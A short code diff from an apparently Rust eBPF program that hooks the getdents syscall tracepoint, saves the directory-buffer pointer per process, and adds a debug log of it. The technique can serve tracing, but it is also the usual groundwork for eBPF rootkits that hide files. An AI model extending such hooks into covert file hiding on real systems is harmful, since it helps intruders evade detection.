@@ -66,6 +66,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 
     let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
     map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
+    info!(&ctx, "dirp is 0x{:x}", dirp as u64);
     Ok(0)
 }
 
